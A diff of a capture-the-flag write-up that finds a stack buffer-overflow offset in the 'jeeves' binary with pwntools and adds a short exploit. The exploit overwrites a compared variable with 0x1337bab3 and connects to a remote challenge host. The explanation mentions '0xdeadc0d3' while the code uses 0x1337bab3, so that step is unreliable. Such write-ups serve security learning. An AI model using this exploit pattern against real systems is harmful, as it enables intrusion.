@@ -40,10 +40,10 @@ This binary prints some text, and compares the input with `0x1337bab3` if it's t
 0x0000555555555236 <+77>:    cmp    DWORD PTR [rbp-0x4],0x1337bab3
 ```
 
-The main function is using `read` that is vulnerable to a buffer overflow let's find the offset, first generate a cyclic pattern
+The main function is using `gets` that is vulnerable to a buffer overflow let's find the offset, first generate a cyclic pattern
 
 ```
->>> from pwn import *                                                                                                                                                                  [22/26]
+>>> from pwn import *                                                                                                                                                                 
 >>> cyclic(100)                                                                                                                                                                               
 b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 ```
@@ -84,6 +84,24 @@ RAX  0x0
 Now let's see the offset with `cyclic_pattern()`:
 
 ```python
->>> cyclic_find(0x61616173)                                                                     
-72
+>>> cyclic_find(0x61616172)                                                                     
+68
+```
+
+And substract 8 because we want to put where `0xdeadc0d3` is
+
+The exploit would be like this:
+
+```python
+from pwn import *
+
+elf = ELF("./jeeves")
+
+p = remote("178.128.40.63",30567)
+
+payload = b"a"*60
+payload += p64(0x1337bab3)
+	
+p.sendline(payload)
+p.interactive()
 ```
